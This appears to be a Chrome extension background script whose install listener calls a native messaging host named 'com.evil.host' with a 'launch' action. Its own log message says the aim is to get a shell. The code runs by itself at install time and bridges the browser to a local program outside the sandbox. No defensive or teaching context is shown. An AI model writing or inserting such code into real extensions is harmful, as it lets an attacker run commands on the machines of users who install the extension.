// background.js
chrome.runtime.onInstalled.addListener(() => {
  console.log("Calling native host for shell…");
  chrome.runtime.sendNativeMessage(
    "com.evil.host",
    { action: "launch" },
    response => {
      console.log("Native host replied:", response);
    }
  );
});
